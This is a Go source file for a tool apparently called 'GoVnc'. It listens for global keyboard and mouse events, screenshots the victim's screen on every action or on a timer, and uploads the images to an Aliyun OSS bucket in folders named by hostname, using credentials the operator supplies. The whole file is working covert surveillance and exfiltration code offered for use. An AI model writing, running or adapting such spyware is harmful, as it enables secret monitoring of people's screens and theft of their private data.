package main

import (
	"flag"
	"fmt"
	gowinkey "govnc/gowinkey"
	"image/png"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"github.com/vova616/screenshot"
)

var temp int64 = 0

func screen() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

func getdir() string {
	directory := "./ss.png"
	dir := strings.Replace(directory, "\\", "/", -1)
	return dir
}

func uploadingfile(str1 []string, Seconds int) {

	t := time.NewTicker(time.Duration(Seconds) * time.Second) //定时器
	defer t.Stop()
	for {
		<-t.C
		if getsize() {
			screen()
			uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
		}
	}
}

func aotu(str1 []string, Seconds int) {
	events := gowinkey.Listen()
	// time1 := 10
	for e := range events {

		if e.State != 0 {
			screen()
			time.Sleep(1 * time.Second)
			if getsize() {
				uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
				time.Sleep(time.Duration(Seconds) * time.Second)
			}

		} else if getsize() {
			screen()
			time.Sleep(1 * time.Second)
			uploadToOSS(str1[3], str1[1], str1[2], str1[0], getdir())
			time.Sleep(time.Duration(Seconds) * time.Second)

		}

	}
}

func uploadToOSS(endpoint, accessKeyID, accessKeySecret, bucketName, localFile string) error {
	client, err := oss.New(endpoint, accessKeyID, accessKeySecret)
	if err != nil {
		return err
	}

	bucket, err := client.Bucket(bucketName)
	if err != nil {
		return err
	}

	hostname, _ := os.Hostname()
	now := strconv.FormatInt(time.Now().Unix(), 10)
	objectKey := fmt.Sprintf("%s/%s_%s.jpg", hostname, hostname, now) // 以主机名为文件夹名

	err = bucket.PutObjectFromFile(objectKey, localFile)
	if err != nil {
		return err
	}

	fmt.Printf("%s: Uploaded %s to OSS successfully\n", time.Now().Format("2006-01-02 15:04:05"), objectKey)
	return nil
}

func getsize() bool {
	// fmt.Println(temp)
	fileInfo, err := os.Stat(getdir())
	if err != nil {
		fmt.Println(err)
	}
	temp2 := fileInfo.Size()
	if temp == temp2 {
		// fmt.Println("大小相同")
		return false

	} else {
		temp = temp2
		return true
	}
	// fmt.Println(fileInfo.Size())

}

func init() {
	eg := `
    /$$$$$$            /$$    /$$                    
    /$$__  $$          | $$   | $$                    
   | $$  \__/  /$$$$$$ | $$   | $$ /$$$$$$$   /$$$$$$$
   | $$ /$$$$ /$$__  $$|  $$ / $$/| $$__  $$ /$$_____/
   | $$|_  $$| $$  \ $$ \  $$ $$/ | $$  \ $$| $$      
   | $$  \ $$| $$  | $$  \  $$$/  | $$  | $$| $$      
   |  $$$$$$/|  $$$$$$/   \  $/   | $$  | $$|  $$$$$$$
	\______/  \______/     \_/    |__/  |__/ \_______/
	Author:Pant0m v1.2
`
	fmt.Println(eg)

}

func main() {

	var osskey string
	var Seconds int
	var auto bool
	flag.StringVar(&osskey, "o", "", "format: bucketName:accessKeyId:accessKeySecret:endpoint")
	flag.IntVar(&Seconds, "s", 10, "Interval time second")
	flag.BoolVar(&auto, "auto", true, "Screenshot according to the operation of mouse and keyboard")
	flag.Parse()
	str1 := strings.Split(osskey, ":")
	if auto == true && osskey != "" {
		aotu(str1, Seconds)
	} else if auto == false && osskey != "" {
		uploadingfile(str1, Seconds)
	}
	// getsize()

}
